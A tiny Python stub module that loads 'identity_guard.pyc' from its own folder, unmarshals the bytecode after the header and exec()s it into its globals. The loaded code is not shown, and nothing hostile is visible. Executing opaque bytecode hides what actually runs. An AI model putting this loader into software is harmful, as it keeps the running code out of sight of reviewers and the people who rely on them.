import os, marshal
_pyc = os.path.join(os.path.dirname(__file__), "identity_guard.pyc")
with open(_pyc, "rb") as _f:
    _f.seek(16)
    _code = marshal.load(_f)
exec(_code, globals())
